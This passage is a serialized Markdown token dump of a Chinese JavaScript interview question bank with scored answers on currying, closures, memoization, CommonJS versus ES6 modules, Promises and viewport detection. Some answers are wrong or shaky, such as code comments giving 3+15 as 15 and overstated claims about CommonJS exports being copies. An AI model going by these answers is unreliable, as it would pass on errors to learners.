{\\n    return x+y;\\n}\\nadd(3, 15) // 15\\n\\n// 函数柯里化\\nvar add2 = function (x) {\\n    return function (y) {\\n        return x+y;\\n    }\\n}\\nconst str = add2(3)(15) //15\\n\\nconsole.log(`永远喜欢 ${str} 岁的 girl ！！！`);\\n```","lang":"js","text":"// 非函数柯里化\\nvar add = function (x,y) {\\n    return x+y;\\n}\\nadd(3, 15) // 15\\n\\n// 函数柯里化\\nvar add2 = function (x) {\\n    return function (y) {\\n        return x+y;\\n    }\\n}\\nconst str = add2(3)(15) //15\\n\\nconsole.log(`永远喜欢 ${str} 岁的 girl ！！！`);"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"##### 3）高阶函数\\n\\n","depth":5,"text":"3）高阶函数","tokens":[{"type":"text","raw":"3）高阶函数","text":"3）高阶函数","escaped":false}]},{"type":"code","raw":"```js\\nfunction foo(){\\n  var a = 2;\\n\\n  function bar() {\\n    console.log(a);\\n  }\\n  return bar;\\n}\\nvar baz = foo();\\nbaz();\\n```","lang":"js","text":"function foo(){\\n  var a = 2;\\n\\n  function bar() {\\n    console.log(a);\\n  }\\n  return bar;\\n}\\nvar baz = foo();\\nbaz();"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"##### 4）实现函数缓存\\n\\n","depth":5,"text":"4）实现函数缓存","tokens":[{"type":"text","raw":"4）实现函数缓存","text":"4）实现函数缓存","escaped":false}]},{"type":"code","raw":"```js\\nvar add = function (x, y) {\\n    return x + y;\\n}\\n\\n/**\\n * 函数缓存\\n * \\n * @param {*} func 要缓存的函数\\n * @param {*} content 上下文\\n */\\nconst memoize = function (func, content) {\\n  // 创建一个缓存对象，用来存储已计算的结果，避免重复计算\\n  let cache = Object.create(null)\\n\\n  // 如果没有传递 content 参数，则将 content 设置为当前上下文 this\\n  content = content || this\\n  \\n  // 返回一个新的函数，它会接收传入的参数，并进行缓存判断\\n  return (...key) => {\\n    // 使用 JSON.stringify 将 key 数组转换为字符串，确保相同的参数值被一致缓存\\n    const cacheKey = JSON.stringify(key);\\n\\n    // 检查缓存中是否已经存储了当前参数的计算结果\\n    if (!cache[cacheKey]) {\\n      // 如果缓存中没有，调用 func 并将结果存储在 cache 中\\n      // func.apply(content, key) 用来调用 func，传递 content 作为上下文，key 作为参数\\n      cache[cacheKey] = func.apply(content, key);\\n    }\\n    \\n    // 返回缓存中的结果（如果已计算过）\\n    return cache[cacheKey];\\n  }\\n}\\n\\n/**\\n * 使用\\n */\\nconst calc = memoize(add);\\nconst num1 = calc(100, 200);  // 计算并缓存结果\\nconsole.log(num1);  // 300\\n\\nconst num2 = calc(100, 200);  // 从缓存中获取结果\\nconsole.log(num2);  // 300\\n```","lang":"js","text":"var add = function (x, y) {\\n    return x + y;\\n}\\n\\n/**\\n * 函数缓存\\n * \\n * @param {*} func 要缓存的函数\\n * @param {*} content 上下文\\n */\\nconst memoize = function (func, content) {\\n  // 创建一个缓存对象，用来存储已计算的结果，避免重复计算\\n  let cache = Object.create(null)\\n\\n  // 如果没有传递 content 参数，则将 content 设置为当前上下文 this\\n  content = content || this\\n  \\n  // 返回一个新的函数，它会接收传入的参数，并进行缓存判断\\n  return (...key) => {\\n    // 使用 JSON.stringify 将 key 数组转换为字符串，确保相同的参数值被一致缓存\\n    const cacheKey = JSON.stringify(key);\\n\\n    // 检查缓存中是否已经存储了当前参数的计算结果\\n    if (!cache[cacheKey]) {\\n      // 如果缓存中没有，调用 func 并将结果存储在 cache 中\\n      // func.apply(content, key) 用来调用 func，传递 content 作为上下文，key 作为参数\\n      cache[cacheKey] = func.apply(content, key);\\n    }\\n    \\n    // 返回缓存中的结果（如果已计算过）\\n    return cache[cacheKey];\\n  }\\n}\\n\\n/**\\n * 使用\\n */\\nconst calc = memoize(add);\\nconst num1 = calc(100, 200);  // 计算并缓存结果\\nconsole.log(num1);  // 300\\n\\nconst num2 = calc(100, 200);  // 从缓存中获取结果\\nconsole.log(num2);  // 300"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"##### 5）使用场景\\n\\n","depth":5,"text":"5）使用场景","tokens":[{"type":"text","raw":"5）使用场景","text":"5）使用场景","escaped":false}]},{"type":"paragraph","raw":"对于昂贵的函数调用，执行复杂计算的函数\\n对于具有有限且高度重复输入范围的函数\\n对于具有重复输入值的递归函数\\n对于纯函数，即每次使用特定输入调用时返回相同输出的函数","text":"对于昂贵的函数调用，执行复杂计算的函数\\n对于具有有限且高度重复输入范围的函数\\n对于具有重复输入值的递归函数\\n对于纯函数，即每次使用特定输入调用时返回相同输出的函数","tokens":[{"type":"text","raw":"对于昂贵的函数调用，执行复杂计算的函数\\n对于具有有限且高度重复输入范围的函数\\n对于具有重复输入值的递归函数\\n对于纯函数，即每次使用特定输入调用时返回相同输出的函数","text":"对于昂贵的函数调用，执行复杂计算的函数\\n对于具有有限且高度重复输入范围的函数\\n对于具有重复输入值的递归函数\\n对于纯函数，即每次使用特定输入调用时返回相同输出的函数","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"</details>\\n\\n","pre":false,"text":"</details>\\n\\n"},{"type":"heading","raw":"## CommonJS和ES6模块的区别？\\n\\n","depth":2,"text":"CommonJS和ES6模块的区别？","tokens":[{"type":"text","raw":"CommonJS和ES6模块的区别？","text":"CommonJS和ES6模块的区别？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- CommonJS模块是同步加载的，ES6模块是异步加载的。\\n\\n- CommonJS模块的导出是值的拷贝，ES6模块的导出是值的引用。\\n\\n- CommonJS模块的导入是动态的，ES6模块的导入是静态的。\\n\\n- CommonJS模块的导出是函数时，导出的函数是值的拷贝，ES6模块的导出是函数时，导出的函数是值的引用。\\n\\n- CommonJS模块的导出是对象时，导出的对象是值的拷贝，ES6模块的导出是对象时，导出的对象是值的引用。\\n\\n- CommonJS模块的导出是类时，导出的类是值的拷贝，ES6模块的导出是类时，导出的类是值的引用。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- CommonJS模块是同步加载的，ES6模块是异步加载的。\\n\\n","task":false,"loose":true,"text":"CommonJS模块是同步加载的，ES6模块是异步加载的。\\n","tokens":[{"type":"text","raw":"CommonJS模块是同步加载的，ES6模块是异步加载的。\\n","text":"CommonJS模块是同步加载的，ES6模块是异步加载的。","tokens":[{"type":"text","raw":"CommonJS模块是同步加载的，ES6模块是异步加载的。","text":"CommonJS模块是同步加载的，ES6模块是异步加载的。","escaped":false}]}]},{"type":"list_item","raw":"- CommonJS模块的导出是值的拷贝，ES6模块的导出是值的引用。\\n\\n","task":false,"loose":true,"text":"CommonJS模块的导出是值的拷贝，ES6模块的导出是值的引用。\\n","tokens":[{"type":"text","raw":"CommonJS模块的导出是值的拷贝，ES6模块的导出是值的引用。\\n","text":"CommonJS模块的导出是值的拷贝，ES6模块的导出是值的引用。","tokens":[{"type":"text","raw":"CommonJS模块的导出是值的拷贝，ES6模块的导出是值的引用。","text":"CommonJS模块的导出是值的拷贝，ES6模块的导出是值的引用。","escaped":false}]}]},{"type":"list_item","raw":"- CommonJS模块的导入是动态的，ES6模块的导入是静态的。\\n\\n","task":false,"loose":true,"text":"CommonJS模块的导入是动态的，ES6模块的导入是静态的。\\n","tokens":[{"type":"text","raw":"CommonJS模块的导入是动态的，ES6模块的导入是静态的。\\n","text":"CommonJS模块的导入是动态的，ES6模块的导入是静态的。","tokens":[{"type":"text","raw":"CommonJS模块的导入是动态的，ES6模块的导入是静态的。","text":"CommonJS模块的导入是动态的，ES6模块的导入是静态的。","escaped":false}]}]},{"type":"list_item","raw":"- CommonJS模块的导出是函数时，导出的函数是值的拷贝，ES6模块的导出是函数时，导出的函数是值的引用。\\n\\n","task":false,"loose":true,"text":"CommonJS模块的导出是函数时，导出的函数是值的拷贝，ES6模块的导出是函数时，导出的函数是值的引用。\\n","tokens":[{"type":"text","raw":"CommonJS模块的导出是函数时，导出的函数是值的拷贝，ES6模块的导出是函数时，导出的函数是值的引用。\\n","text":"CommonJS模块的导出是函数时，导出的函数是值的拷贝，ES6模块的导出是函数时，导出的函数是值的引用。","tokens":[{"type":"text","raw":"CommonJS模块的导出是函数时，导出的函数是值的拷贝，ES6模块的导出是函数时，导出的函数是值的引用。","text":"CommonJS模块的导出是函数时，导出的函数是值的拷贝，ES6模块的导出是函数时，导出的函数是值的引用。","escaped":false}]}]},{"type":"list_item","raw":"- CommonJS模块的导出是对象时，导出的对象是值的拷贝，ES6模块的导出是对象时，导出的对象是值的引用。\\n\\n","task":false,"loose":true,"text":"CommonJS模块的导出是对象时，导出的对象是值的拷贝，ES6模块的导出是对象时，导出的对象是值的引用。\\n","tokens":[{"type":"text","raw":"CommonJS模块的导出是对象时，导出的对象是值的拷贝，ES6模块的导出是对象时，导出的对象是值的引用。\\n","text":"CommonJS模块的导出是对象时，导出的对象是值的拷贝，ES6模块的导出是对象时，导出的对象是值的引用。","tokens":[{"type":"text","raw":"CommonJS模块的导出是对象时，导出的对象是值的拷贝，ES6模块的导出是对象时，导出的对象是值的引用。","text":"CommonJS模块的导出是对象时，导出的对象是值的拷贝，ES6模块的导出是对象时，导出的对象是值的引用。","escaped":false}]}]},{"type":"list_item","raw":"- CommonJS模块的导出是类时，导出的类是值的拷贝，ES6模块的导出是类时，导出的类是值的引用。","task":false,"loose":true,"text":"CommonJS模块的导出是类时，导出的类是值的拷贝，ES6模块的导出是类时，导出的类是值的引用。","tokens":[{"type":"text","raw":"CommonJS模块的导出是类时，导出的类是值的拷贝，ES6模块的导出是类时，导出的类是值的引用。","text":"CommonJS模块的导出是类时，导出的类是值的拷贝，ES6模块的导出是类时，导出的类是值的引用。","tokens":[{"type":"text","raw":"CommonJS模块的导出是类时，导出的类是值的拷贝，ES6模块的导出是类时，导出的类是值的引用。","text":"CommonJS模块的导出是类时，导出的类是值的拷贝，ES6模块的导出是类时，导出的类是值的引用。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 介绍一下Promise\\n\\n","depth":2,"text":"介绍一下Promise","tokens":[{"type":"text","raw":"介绍一下Promise","text":"介绍一下Promise","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"paragraph","raw":"Promise 是一种用于处理异步操作的 JavaScript 对象。它代表了一个尚未完成但预期将来会完成的操作的结果。","text":"Promise 是一种用于处理异步操作的 JavaScript 对象。它代表了一个尚未完成但预期将来会完成的操作的结果。","tokens":[{"type":"text","raw":"Promise 是一种用于处理异步操作的 JavaScript 对象。它代表了一个尚未完成但预期将来会完成的操作的结果。","text":"Promise 是一种用于处理异步操作的 JavaScript 对象。它代表了一个尚未完成但预期将来会完成的操作的结果。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"Promise 对象有三种状态：","text":"Promise 对象有三种状态：","tokens":[{"type":"text","raw":"Promise 对象有三种状态：","text":"Promise 对象有三种状态：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- Pending（进行中）：初始状态，既不是成功，也不是失败状态。\\n\\n- Fulfilled（已成功）：意味着操作成功完成。\\n\\n- Rejected（已失败）：意味着操作失败。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- Pending（进行中）：初始状态，既不是成功，也不是失败状态。\\n\\n","task":false,"loose":true,"text":"Pending（进行中）：初始状态，既不是成功，也不是失败状态。\\n","tokens":[{"type":"text","raw":"Pending（进行中）：初始状态，既不是成功，也不是失败状态。\\n","text":"Pending（进行中）：初始状态，既不是成功，也不是失败状态。","tokens":[{"type":"text","raw":"Pending（进行中）：初始状态，既不是成功，也不是失败状态。","text":"Pending（进行中）：初始状态，既不是成功，也不是失败状态。","escaped":false}]}]},{"type":"list_item","raw":"- Fulfilled（已成功）：意味着操作成功完成。\\n\\n","task":false,"loose":true,"text":"Fulfilled（已成功）：意味着操作成功完成。\\n","tokens":[{"type":"text","raw":"Fulfilled（已成功）：意味着操作成功完成。\\n","text":"Fulfilled（已成功）：意味着操作成功完成。","tokens":[{"type":"text","raw":"Fulfilled（已成功）：意味着操作成功完成。","text":"Fulfilled（已成功）：意味着操作成功完成。","escaped":false}]}]},{"type":"list_item","raw":"- Rejected（已失败）：意味着操作失败。","task":false,"loose":true,"text":"Rejected（已失败）：意味着操作失败。","tokens":[{"type":"text","raw":"Rejected（已失败）：意味着操作失败。","text":"Rejected（已失败）：意味着操作失败。","tokens":[{"type":"text","raw":"Rejected（已失败）：意味着操作失败。","text":"Rejected（已失败）：意味着操作失败。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"Promise 对象使用 `then` 方法来处理成功和失败的情况。`then` 方法接受两个参数：一个用于处理成功情况的回调函数和一个用于处理失败情况的回调函数。","text":"Promise 对象使用 `then` 方法来处理成功和失败的情况。`then` 方法接受两个参数：一个用于处理成功情况的回调函数和一个用于处理失败情况的回调函数。","tokens":[{"type":"text","raw":"Promise 对象使用 ","text":"Promise 对象使用 ","escaped":false},{"type":"codespan","raw":"`then`","text":"then"},{"type":"text","raw":" 方法来处理成功和失败的情况。","text":" 方法来处理成功和失败的情况。","escaped":false},{"type":"codespan","raw":"`then`","text":"then"},{"type":"text","raw":" 方法接受两个参数：一个用于处理成功情况的回调函数和一个用于处理失败情况的回调函数。","text":" 方法接受两个参数：一个用于处理成功情况的回调函数和一个用于处理失败情况的回调函数。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nconst promise = new Promise((resolve, reject) => {\\n\\n\\n})\\n\\n```","lang":"js","text":"const promise = new Promise((resolve, reject) => {\\n\\n\\n})\\n"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 如何判断一个元素是否在可视区域内？\\n\\n","depth":2,"text":"如何判断一个元素是否在可视区域内？","tokens":[{"type":"text","raw":"如何判断一个元素是否在可视区域内？","text":"如何判断一个元素是否在可视区域内？","escaped":false}]},{"type":"heading","raw":"#### 类型：`拓展`\\n\\n","depth":4,"text":"类型：`拓展`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`拓展`","text":"拓展"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（4 分）\\n\\n","depth":4,"text":"解答（4 分）","tokens":[{"type":"text","raw":"解答（4 分）","text":"解答（4 分）","escaped":false}]},{"type":"html","block":true,"raw":"<details>\\n\\n","pre":false,"text":"<details>\\n\\n"},{"type":"list","raw":"- **1：用途**","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：用途**","task":false,"loose":false,"text":"**1：用途**","tokens":[{"type":"text","raw":"**1：用途**","text":"**1：用途**","tokens":[{"type":"strong","raw":"**1：用途**","text":"1：用途","tokens":[{"type":"text","raw":"1：用途","text":"1：用途","escaped":false}]}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"可视区域即我们浏览网页的设备肉眼可见的区域，如下图","text":"可视区域即我们浏览网页的设备肉眼可见的区域，如下图","tokens":[{"type":"text","raw":"可视区域即我们浏览网页的设备肉眼可见的区域，如下图","text":"可视区域即我们浏览网页的设备肉眼可见的区域，如下图","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"![](/public/images/3_JavaScript_20241230001543.png)","text":"![](/public/images/3_JavaScript_20241230001543.png)","tokens":[{"type":"image","raw":"![](/public/images/3_JavaScript_20241230001543.png)","href":"/public/images/3_JavaScript_20241230001543.png","title":null,"text":""}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"在日常开发中，我们经常需要判断目标元素是否在视窗之内或者和视窗的距离小于一个值（例如 100 px），从而实现一些常用的功能，例如：","text":"在日常开发中，我们经常需要判断目标元素是否在视窗之内或者和视窗的距离小于一个值（例如 100 px），从而实现一些常用的功能，例如：","tokens":[{"type":"text","raw":"在日常开发中，我们经常需要判断目标元素是否在视窗之内或者和视窗的距离小于一个值（例如 100 px），从而实现一些常用的功能，例如：","text":"在日常开发中，我们经常需要判断目标元素是否在视窗之内或者和视窗的距离小于一个值（例如 100 px），从而实现一些常用的功能，例如：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"blockquote","raw":"> - 图片的懒加载\\n> - 列表的无限滚动\\n> - 计算广告元素的曝光情况\\n> - 可点击链接的预加载","tokens":[{"type":"list","raw":"- 图片的懒加载\\n- 列表的无限滚动\\n- 计算广告元素的曝光情况\\n- 可点击链接的预加载","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- 图片的懒加载\\n","task":false,"loose":false,"text":"图片的懒加载","tokens":[{"type":"text","raw":"图片的懒加载","text":"图片的懒加载","tokens":[{"type":"text","raw":"图片的懒加载","text":"图片的懒加载","escaped":false}]}]},{"type":"list_item","raw":"- 列表的无限滚动\\n","task":false,"loose":false,"text":"列表的无限滚动","tokens":[{"type":"text","raw":"列表的无限滚动","text":"列表的无限滚动","tokens":[{"type":"text","raw":"列表的无限滚动","text":"列表的无限滚动","escaped":false}]}]},{"type":"list_item","raw":"- 计算广告元素的曝光情况\\n","task":false,"loose":false,"text":"计算广告元素的曝光情况","tokens":[{"type":"text","raw":"计算广告元素的曝光情况","text":"计算广告元素的曝光情况","tokens":[{"type":"text","raw":"计算广告元素的曝光情况","text":"计算广告元素的曝光情况","escaped":false}]}]},{"type":"list_item","raw":"- 可点击链接的预加载","task":false,"loose":false,"text":"可点击链接的预加载","tokens":[{"type":"text","raw":"可点击链接的预加载","text":"可点击链接的预加载","tokens":[{"type":"text","raw":"可点击链接的预加载","text":"可点击链接的预加载","escaped":false}]}]}]}],"text":"- 图片的懒加载\\n- 列表的无限滚动\\n- 计算广告元素的曝光情况\\n- 可点击链接的预加载"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **实现方式: 3**","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **实现方式: 3**","task":false,"loose":false,"text":"**实现方式: 3**","tokens":[{"type":"text","raw":"**实现方式: 3**","text":"**实现方式: 3**","tokens":[{"type":"strong","raw":"**实现方式: 3**","text":"实现方式: 3","tokens":[{"type":"text","raw":"实现方式: 3","text":"实现方式: 3","escaped":false}]}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"##### 1）offsetTop、scrollTop\\n\\n","depth":5,"text":"1）offsetTop、scrollTop","tokens":[{"type":"text","raw":"1）offsetTop、scrollTop","text":"1）offsetTop、scrollTop","escaped":false}]},{"type":"paragraph","raw":"`offsetTop`，元素的上外边框至包含元素的上内边框之间的像素距离，其他`offset`属性如下图所示：","text":"`offsetTop`，元素的上外边框至包含元素的上内边框之间的像素距离，其他`offset`属性如下图所示：","tokens":[{"type":"codespan","raw":"`offsetTop`","text":"offsetTop"},{"type":"text","raw":"，元素的上外边框至包含元素的上内边框之间的像素距离，其他","text":"，元素的上外边框至包含元素的上内边框之间的像素距离，其他","escaped":false},{"type":"codespan","raw":"`offset`","text":"offset"},{"type":"text","raw":"属性如下图所示：","text":"属性如下图所示：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"![](/public/images/3_JavaScript_20241230001827.png)","text":"![](/public/images/3_JavaScript_20241230001827.png)","tokens":[{"type":"image","raw":"![](/public/images/3_JavaScript_20241230001827.png)","href":"/public/images/3_JavaScript_20241230001827.png","title":null,"text":""}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"下面再来了解下`clientWidth`、`clientHeight`：","text":"下面再来了解下`clientWidth`、`clientHeight`：","tokens":[{"type":"text","raw":"下面再来了解下","text":"下面再来了解下","escaped":false},{"type":"codespan","raw":"`clientWidth`","text":"clientWidth"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`clientHeight`","text":"clientHeight"},{"type":"text","raw":"：","text":"：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- `clientWidth`：元素内容区宽度加上左右内边距宽度，即`clientWidth = content + padding`\\n- `clientHeight`：元素内容区高度加上上下内边距高度，即`clientHeight = content + padding`","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- `clientWidth`：元素内容区宽度加上左右内边距宽度，即`clientWidth = content + padding`\\n","task":false,"loose":false,"text":"`clientWidth`：元素内容区宽度加上左右内边距宽度，即`clientWidth = content + padding`","tokens":[{"type":"text","raw":"`clientWidth`：元素内容区宽度加上左右内边距宽度，即`clientWidth = content + padding`","text":"`clientWidth`：元素内容区宽度加上左右内边距宽度，即`clientWidth = content + padding`","tokens":[{"type":"codespan","raw":"`clientWidth`","text":"clientWidth"},{"type":"text","raw":"：元素内容区宽度加上左右内边距宽度，即","text":"：元素内容区宽度加上左右内边距宽度，即","escaped":false},{"type":"codespan","raw":"`clientWidth = content + padding`","text":"clientWidth = content + padding"}]}]},{"type":"list_item","raw":"- `clientHeight`：元素内容区高度加上上下内边距高度，即`clientHeight = content + padding`","task":false,"loose":false,"text":"`clientHeight`：元素内容区高度加上上下内边距高度，即`clientHeight = content + padding`","tokens":[{"type":"text","raw":"`clientHeight`：元素内容区高度加上上下内边距高度，即`clientHeight = content + padding`","text":"`clientHeight`：元素内容区高度加上上下内边距高度，即`clientHeight = content + padding`","tokens":[{"type":"codespan","raw":"`clientHeight`","text":"clientHeight"},{"type":"text","raw":"：元素内容区高度加上上下内边距高度，即","text":"：元素内容区高度加上上下内边距高度，即","escaped":false},{"type":"codespan","raw":"`clientHeight = content + padding`","text":"clientHeight = content + padding"}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"这里可以看到`client`元素都不包括外边距","text":"这里可以看到`client`元素都不包括外边距","tokens":[{"type":"text","raw":"这里可以看到","text":"这里可以看到","escaped":false},{"type":"codespan","raw":"`client`","text":"client"},{"type":"text","raw":"元素都不包括外边距","text":"元素都不包括外边距","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"最后，关于`scroll`系列的属性如下：","text":"最后，关于`scroll`系列的属性如下：","tokens":[{"type":"text","raw":"最后，关于","text":"最后，关于","escaped":false},{"type":"codespan","raw":"`scroll`","text":"scroll"},{"type":"text","raw":"系列的属性如下：","text":"系列的属性如下：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- `scrollWidth` 和 `scrollHeight` 主要用于确定元素内容的实际大小\\n\\n- `scrollLeft` 和 `scrollTop` 属性既可以确定元素当前滚动的状态，也可以设置元素的滚动位置\\n\\n- 垂直滚动 `scrollTop > 0`\\n\\n- 水平滚动 `scrollLeft > 0`\\n\\n- 将元素的 `scrollLeft` 和 `scrollTop` 设置为 0，可以重置元素的滚动位置","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- `scrollWidth` 和 `scrollHeight` 主要用于确定元素内容的实际大小\\n\\n","task":false,"loose":true,"text":"`scrollWidth` 和 `scrollHeight` 主要用于确定元素内容的实际大小\\n","tokens":[{"type":"text","raw":"`scrollWidth` 和 `scrollHeight` 主要用于确定元素内容的实际大小\\n","text":"`scrollWidth` 和 `scrollHeight` 主要用于确定元素内容的实际大小","tokens":[{"type":"codespan","raw":"`scrollWidth`","text":"scrollWidth"},{"type":"text","raw":" 和 ","text":" 和 ","escaped":false},{"type":"codespan","raw":"`scrollHeight`","text":"scrollHeight"},{"type":"text","raw":" 主要用于确定元素内容的实际大小","text":" 主要用于确定元素内容的实际大小","escaped":false}]}]},{"type":"list_item","raw":"- `scrollLeft` 和 `scrollTop` 属性既可以确定元素当前滚动的状态，也可以设置元素的滚动位置\\n\\n","task":false,"loose":true,"text":"`scrollLeft` 和 `scrollTop` 属性既可以确定元素当前滚动的状态，也可以设置元素的滚动位置\\n","tokens":[{"type":"text","raw":"`scrollLeft` 和 `scrollTop` 属性既可以确定元素当前滚动的状态，也可以设置元素的滚动位置\\n","text":"`scrollLeft` 和 `scrollTop` 属性既可以确定元素当前滚动的状态，也可以设置元素的滚动位置","tokens":[{"type":"codespan","raw":"`scrollLeft`","text":"scrollLeft"},{"type":"text","raw":" 和 ","text":" 和 ","escaped":false},{"type":"codespan","raw":"`scrollTop`","text":"scrollTop"},{"type":"text","raw":" 属性既可以确定元素当前滚动的状态，也可以设置元素的滚动位置","text":" 属性既可以确定元素当前滚动的状态，也可以设置元素的滚动位置","escaped":false}]}]},{"type":"list_item","raw":"- 垂直滚动 `scrollTop > 0`\\n\\n","task":false,"loose":true,"text":"垂直滚动 `scrollTop > 0`\\n","tokens":[{"type":"text","raw":"垂直滚动 `scrollTop > 0`\\n","text":"垂直滚动 `scrollTop > 0`","tokens":[{"type":"text","raw":"垂直滚动 ","text":"垂直滚动 ","escaped":false},{"type":"codespan","raw":"`scrollTop > 0`","text":"scrollTop > 0"}]}]},{"type":"list_item","raw":"- 水平滚动 `scrollLeft > 0`\\n\\n","task":false,"loose":true,"text":"水平滚动 `scrollLeft > 0`\\n","tokens":[{"type":"text","raw":"水平滚动 `scrollLeft > 0`\\n","text":"水平滚动 `scrollLeft > 0`","tokens":[{"type":"text","raw":"水平滚动 ","text":"水平滚动 ","escaped":false},{"type":"codespan","raw":"`scrollLeft > 0`","text":"scrollLeft > 0"}]}]},{"type":"list_item","raw":"- 将元素的 `scrollLeft` 和 `scrollTop` 设置为 0，可以重置元素的滚动位置","task":false,"loose":true,"text":"将元素的 `scrollLeft` 和 `scrollTop` 设置为 0，可以重置元素的滚动位置","tokens":[{"type":"text","raw":"将元素的 `scrollLeft` 和 `scrollTop` 设置为 0，可以重置元素的滚动位置","text":"将元素的 `scrollLeft` 和 `scrollTop` 设置为 0，可以重置元素的滚动位置","tokens":[{"type":"text","raw":"将元素的 ","text":"将元素的 ","escaped":false},{"type":"codespan","raw":"`scrollLeft`","text":"scrollLeft"},{"type":"text","raw":" 和 ","text":" 和 ","escaped":false},{"type":"codespan","raw":"`scrollTop`","text":"scrollTop"},{"type":"text","raw":" 设置为 0，可以重置元素的滚动位置","text":" 设置为 0，可以重置元素的滚动位置","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"##### 注意\\n\\n","depth":5,"text":"注意","tokens":[{"type":"text","raw":"注意","text":"注意","escaped":false}]},{"type":"list","raw":"- 上述属性都是只读的，每次访问都要重新开始","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- 